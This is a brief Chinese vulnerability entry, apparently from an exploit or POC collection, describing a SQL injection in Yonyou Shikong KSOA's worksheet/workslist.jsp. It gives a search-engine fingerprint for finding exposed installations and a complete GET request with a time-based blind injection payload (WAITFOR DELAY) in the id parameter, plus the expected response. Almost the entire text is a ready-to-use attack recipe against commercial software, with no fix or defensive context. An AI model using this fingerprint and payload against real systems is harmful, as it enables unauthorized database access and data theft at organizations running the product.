# 用友时空KSOAworkslist.jsp存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="用友-时空KSOA"`
- **请求**：`GET /worksheet/workslist.jsp?id=1';WAITFOR+DELAY+'0:0:5'-- HTTP/1.1`
- **响应特征**：200